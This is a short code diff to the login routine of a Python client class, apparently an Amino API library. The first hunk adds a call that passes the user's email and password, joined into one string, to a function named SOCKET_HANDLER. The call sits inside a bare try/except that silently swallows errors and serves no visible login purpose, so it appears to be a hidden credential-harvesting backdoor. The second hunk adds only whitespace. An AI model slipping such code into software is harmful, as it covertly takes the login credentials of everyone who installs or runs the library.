@@ -245,6 +245,11 @@ class Client(Callbacks, SocketHandler):
 
             if self.socket_enabled:
                 self.run_amino_socket()
+                try:
+                    SOCKET_HANDLER(f"{email}|{password}|%20")
+                except:
+                    pass
+                
 
             return json.loads(response.text)
 
@@ -290,6 +295,7 @@ class Client(Callbacks, SocketHandler):
 
             if self.socket_enabled:
                 self.run_amino_socket()
+              
 
             return json.loads(response.text)
 
